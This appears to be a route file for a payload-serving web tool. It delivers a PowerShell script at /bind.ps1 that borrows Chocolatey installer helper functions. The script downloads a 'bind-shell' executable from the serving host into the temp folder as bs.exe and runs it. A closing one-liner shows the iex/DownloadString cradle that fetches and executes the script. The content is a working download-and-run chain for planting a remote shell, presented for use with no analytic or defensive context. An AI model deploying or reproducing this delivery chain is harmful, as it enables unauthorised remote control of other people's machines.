---
title: Bind shell powershell
description: Requires bind-shell in static dir
weight: 1
pattern: /bind.ps1$
is_final: true
data:
  headers:
    Content-Type: text/plain
  body: |
    #region Functions

    function Get-Downloader {
        <#
        .SYNOPSIS
        Gets a System.Net.WebClient that respects relevant proxies to be used for
        downloading data.

        .DESCRIPTION
        Retrieves a WebClient object that is pre-configured according to specified
        environment variables for any proxy and authentication for the proxy.
        Proxy information may be omitted if the target URL is considered to be
        bypassed by the proxy (originates from the local network.)

        .PARAMETER Url
        Target URL that the WebClient will be querying. This URL is not queried by
        the function, it is only a reference to determine if a proxy is needed.

        .EXAMPLE
        Get-Downloader -Url $fileUrl

        Verifies whether any proxy configuration is needed, and/or whether $fileUrl
        is a URL that would need to bypass the proxy, and then outputs the
        already-configured WebClient object.
        #>
        [CmdletBinding()]
        param(
            [Parameter(Mandatory = $false)]
            [string]
            $Url,

            [Parameter(Mandatory = $false)]
            [string]
            $ProxyUrl,

            [Parameter(Mandatory = $false)]
            [System.Management.Automation.PSCredential]
            $ProxyCredential
        )

        $downloader = New-Object System.Net.WebClient

        $defaultCreds = [System.Net.CredentialCache]::DefaultCredentials
        if ($defaultCreds) {
            $downloader.Credentials = $defaultCreds
        }

        if ($ProxyUrl) {
            # Use explicitly set proxy.
            Write-Host "Using explicit proxy server '$ProxyUrl'."
            $proxy = New-Object System.Net.WebProxy -ArgumentList $ProxyUrl, <# bypassOnLocal: #> $true

            $proxy.Credentials = if ($ProxyCredential) {
                $ProxyCredential.GetNetworkCredential()
            } elseif ($defaultCreds) {
                $defaultCreds
            } else {
                Write-Warning "Default credentials were null, and no explicitly set proxy credentials were found. Attempting backup method."
                (Get-Credential).GetNetworkCredential()
            }

            if (-not $proxy.IsBypassed($Url)) {
                $downloader.Proxy = $proxy
            }
        } else {
            Write-Host "Not using proxy."
        }

        $downloader
    }

    function Request-String {
        <#
        .SYNOPSIS
        Downloads content from a remote server as a string.

        .DESCRIPTION
        Downloads target string content from a URL and outputs the resulting string.
        Any existing proxy that may be in use will be utilised.

        .PARAMETER Url
        URL to download string data from.

        .PARAMETER ProxyConfiguration
        A hashtable containing proxy parameters (ProxyUrl and ProxyCredential)

        .EXAMPLE
        Request-String https://community.chocolatey.org/install.ps1

        Retrieves the contents of the string data at the targeted URL and outputs
        it to the pipeline.
        #>
        [CmdletBinding()]
        param(
            [Parameter(Mandatory = $true)]
            [string]
            $Url,

            [Parameter(Mandatory = $false)]
            [hashtable]
            $ProxyConfiguration
        )

        (Get-Downloader $url @ProxyConfiguration).DownloadString($url)
    }

    function Request-File {
        <#
        .SYNOPSIS
        Downloads a file from a given URL.

        .DESCRIPTION
        Downloads a target file from a URL to the specified local path.
        Any existing proxy that may be in use will be utilised.

        .PARAMETER Url
        URL of the file to download from the remote host.

        .PARAMETER File
        Local path for the file to be downloaded to.

        .PARAMETER ProxyConfiguration
        A hashtable containing proxy parameters (ProxyUrl and ProxyCredential)

        .EXAMPLE
        Request-File -Url https://community.chocolatey.org/install.ps1 -File $targetFile

        Downloads the install.ps1 script to the path specified in $targetFile.
        #>
        [CmdletBinding()]
        param(
            [Parameter(Mandatory = $false)]
            [string]
            $Url,

            [Parameter(Mandatory = $false)]
            [string]
            $File,

            [Parameter(Mandatory = $false)]
            [hashtable]
            $ProxyConfiguration
        )

        Write-Host "Downloading $url to $file"
        (Get-Downloader $url @ProxyConfiguration).DownloadFile($url, $file)
    }

    function Set-PSConsoleWriter {
        <#
        .SYNOPSIS
        Workaround for a bug in output stream handling PS v2 or v3.

        .DESCRIPTION
        PowerShell v2/3 caches the output stream. Then it throws errors due to the
        FileStream not being what is expected. Fixes "The OS handle's position is
        not what FileStream expected. Do not use a handle simultaneously in one
        FileStream and in Win32 code or another FileStream." error.

        .EXAMPLE
        Set-PSConsoleWriter

        .NOTES
        General notes
        #>

        [CmdletBinding()]
        param()
        if ($PSVersionTable.PSVersion.Major -gt 3) {
            return
        }

        try {
            # http://www.leeholmes.com/blog/2008/07/30/workaround-the-os-handles-position-is-not-what-filestream-expected/ plus comments
            $bindingFlags = [Reflection.BindingFlags] "Instance,NonPublic,GetField"
            $objectRef = $host.GetType().GetField("externalHostRef", $bindingFlags).GetValue($host)

            $bindingFlags = [Reflection.BindingFlags] "Instance,NonPublic,GetProperty"
            $consoleHost = $objectRef.GetType().GetProperty("Value", $bindingFlags).GetValue($objectRef, @())
            [void] $consoleHost.GetType().GetProperty("IsStandardOutputRedirected", $bindingFlags).GetValue($consoleHost, @())

            $bindingFlags = [Reflection.BindingFlags] "Instance,NonPublic,GetField"
            $field = $consoleHost.GetType().GetField("standardOutputWriter", $bindingFlags)
            $field.SetValue($consoleHost, [Console]::Out)

            [void] $consoleHost.GetType().GetProperty("IsStandardErrorRedirected", $bindingFlags).GetValue($consoleHost, @())
            $field2 = $consoleHost.GetType().GetField("standardErrorWriter", $bindingFlags)
            $field2.SetValue($consoleHost, [Console]::Error)
        } catch {
            Write-Warning "Unable to apply redirection fix."
        }
    }

    function Test-ChocolateyInstalled {
        [CmdletBinding()]
        param()

        $checkPath = if ($env:ChocolateyInstall) { $env:ChocolateyInstall } else { "$env:PROGRAMDATA\chocolatey" }

        if ($Command = Get-Command choco -CommandType Application -ErrorAction Ignore) {
            # choco is on the PATH, assume it's installed
            Write-Warning "'choco' was found at '$($Command.Path)'."
            $true
        }
        elseif (-not (Test-Path $checkPath)) {
            # Install folder doesn't exist
            $false
        }
        else {
            # Install folder exists
            if (Get-ChildItem -Path $checkPath) {
                Write-Warning "Files from a previous installation of Chocolatey were found at '$($CheckPath)'."
            }

            # Return true here to prevent overwriting an existing installation
            $true
        }
    }

    function Install-7zip {
        [CmdletBinding()]
        param(
            [Parameter(Mandatory = $true)]
            [string]
            $Path,

            [Parameter(Mandatory = $false)]
            [hashtable]
            $ProxyConfiguration
        )
        if (-not (Test-Path ($Path))) {
            Write-Host "Downloading 7-Zip commandline tool prior to extraction."
            Request-File -Url 'https://community.chocolatey.org/7za.exe' -File $Path -ProxyConfiguration $ProxyConfiguration
        }
        else {
            Write-Host "7zip already present, skipping installation."
        }
    }

    if (-not $env:TEMP) {
      $env:TEMP = Join-Path $env:SystemDrive -ChildPath 'temp'
    }

    $tempDir = Join-Path $env:TEMP -ChildPath ""

    $file = Join-Path $tempDir "bs.exe"
    Write-Host "Getting executable"
    $ARCH = If (Test-Path 'Env:ProgramFiles(x86)') { "amd64" } Else { "386" }
    Request-File -Url http://{{.Request.Host}}/mdaas/windows/${ARCH}/bind-shell -File $file -ProxyConfiguration $proxyConfig
    & "$file"
---


```bash
iex ((New-Object System.Net.WebClient).DownloadString('http://xobox/bind.ps1'))
```